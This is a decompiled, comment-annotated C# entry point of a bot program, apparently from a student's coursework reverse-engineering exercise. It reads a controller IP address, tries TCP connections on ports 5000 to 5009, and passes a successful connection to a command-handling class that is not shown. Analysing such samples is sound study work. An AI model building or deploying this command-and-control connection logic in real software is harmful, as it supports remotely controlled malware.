// Decompiled with JetBrains decompiler
// Type: ns0.Class0
// Assembly: bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B05469C7-C319-41CF-853E-3338A96927EC
// Assembly location: C:\Users\blang\Documents\BillsCoursework\cw_2024_2025\b-cleaned.exe

using System;
using System.Net.Sockets;

#nullable disable
namespace ns0
{
  internal class InitialConnector
  {
    // This is the starting point of the bot as it is Main
    private static int Main(string[] args)
    {
      string connect_to_this_ip = "";
      Console.WriteLine("Bot Version 7.0 - 2024/2025");
      int connect_to_this_port = 5000;
      int status_int;
      // If we provide no ip address to connect to
      if (args.Length == 0)
      {
        Console.WriteLine("Please run with bot w.x.y.z, where w.x.y.z is the address of your controller. \r\nVersion 7.0");
        status_int = 0; // Bot closes if status_int = 0
      }
      else
      {
        // Set the ip we are trying to connect to
        if (args.Length > 0)
          connect_to_this_ip = args[0];
        // If we try to pass commands as command line arguments
        if (args.Length > 1)
          Console.WriteLine("Hello: " + args[1]);
        bool flag = false;
        int connect_to_this_port_number = InitialConnector.try_connect(connect_to_this_ip, connect_to_this_port);
        if (connect_to_this_port_number == 0) // This will be 0 if we have failed to connect
        {
          Console.WriteLine("Giving up!");
          status_int = 0; // Bot closes if status_int = 0
                }
        else
        {
          try
          {
            Console.Write("[+]");
            BotCommandActioner class1 = new BotCommandActioner(connect_to_this_ip, connect_to_this_port_number);
          }
          catch (Exception ex)
          {
            if (flag)
              Console.WriteLine(ex.Message);
          }
          status_int = 0; // Bot closes if status_int = 0
        }
      }
      return status_int;
    }

    private static int try_connect(string ip_address, int port_number)
    {
      int connection_port;
      // Try to connect 10 times
      for (int index = 0; index < 10; ++index)
      {
        // Try to start a new tcp client with the given details
        try
        {
          // Every time we try and connect, we increment the port number by 1. E.g 5000, 5001, 5002
          new TcpClient().Connect(ip_address, port_number + index);
          // If we successfully connect then write a question mark
          Console.Write("?");
          connection_port = port_number + index;
          // Return the port number we successfully connected on
          goto label_6;
        }
        // If we fail, then write a dollar sign $
        catch (Exception ex)
        {
          Console.Write("$");
        }
      }
      // If we never manage to connect, then we return 0
      connection_port = 0;
label_6: // Return the port number we successfully connected on
      return connection_port;
    }
  }
}
